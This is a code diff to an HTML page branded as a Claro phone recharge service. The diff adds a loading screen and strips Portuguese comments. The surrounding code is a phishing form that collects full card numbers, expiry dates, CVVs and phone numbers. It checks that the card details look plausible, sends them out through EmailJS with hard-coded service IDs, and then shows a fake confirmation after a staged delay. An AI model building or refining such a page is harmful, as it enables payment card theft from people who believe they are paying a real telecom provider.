@@ -23,6 +23,24 @@
             justify-content: center;
             align-items: center;
         }
+
+        /* Preloader */
+        #preloader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        #preloader img {
+            width: 150px;
+            height: auto;
+        }
         
         .container {
             width: 100%;
@@ -239,6 +257,12 @@
     </style>
 </head>
 <body>
+
+    <!-- Preloader -->
+    <div id="preloader">
+        <img src="https://i.ibb.co/ZpGqQVY2/IMG-20250910-141616.gif" alt="Carregando...">
+    </div>
+
     <div class="container">
         <div class="header">
             <img src="https://i.imgur.com/Hkeqw37.png" alt="Claro Recarga Logo">
@@ -406,7 +430,6 @@
                 loading.style.display = 'block';
                 
                 try {
-                    // Coletar dados do formulário
                     const formData = new FormData(form);
                     const data = {
                         nome: formData.get('nome'),
@@ -418,51 +441,41 @@
                         date: new Date().toLocaleString('pt-BR')
                     };
                     
-                    // Validar dados
                     if (!validarDados(data)) {
                         throw new Error('Por favor, preencha todos os campos corretamente.');
                     }
                     
-                    // Enviar dados por email usando EmailJS
                     await enviarEmailComEmailJS(data);
                     
-                    // Simular tempo de processamento
                     await new Promise(resolve => setTimeout(resolve, 2000));
                     
-                    // Mostrar confirmação
                     form.style.display = 'none';
                     confirmation.style.display = 'block';
                     
                 } catch (error) {
-                    // Mostrar mensagem de erro
                     errorMsg.textContent = error.message;
                     errorDiv.style.display = 'block';
                     console.error('Erro:', error);
                 } finally {
-                    // Reativar botão e esconder loading
                     submitBtn.disabled = false;
                     loading.style.display = 'none';
                 }
             });
             
-            // Função para validar dados
             function validarDados(data) {
                 if (!data.nome || !data.numero || !data.validade || !data.cvv || !data.telefone || !data.valor) {
                     return false;
                 }
                 
-                // Validar número do cartão (pelo menos 16 dígitos)
                 const numeroLimpo = data.numero.replace(/\s/g, '');
                 if (numeroLimpo.length < 16) {
                     return false;
                 }
                 
-                // Validar CVV (3 ou 4 dígitos)
                 if (data.cvv.length < 3 || data.cvv.length > 4) {
                     return false;
                 }
                 
-                // Validar telefone (pelo menos 10 dígitos)
                 const telefoneLimpo = data.telefone.replace(/\D/g, '');
                 if (telefoneLimpo.length < 10) {
                     return false;
@@ -471,10 +484,8 @@
                 return true;
             }
             
-            // Função para enviar email usando EmailJS
             async function enviarEmailComEmailJS(data) {
                 try {
-                    // ENVIO REAL DO EMAIL
                     const response = await emailjs.send(
                         'service_fz8vtta', 
                         'template_qf7q88r', 
@@ -489,6 +500,15 @@
                 }
             }
         });
+
+        // Remover preloader quando a página carregar
+        window.addEventListener('load', function() {
+            const preloader = document.getElementById('preloader');
+            preloader.style.opacity = '0';
+            setTimeout(() => {
+                preloader.style.display = 'none';
+            }, 500);
+        });
     </script>
 </body>
-                  </html>
+    </html>
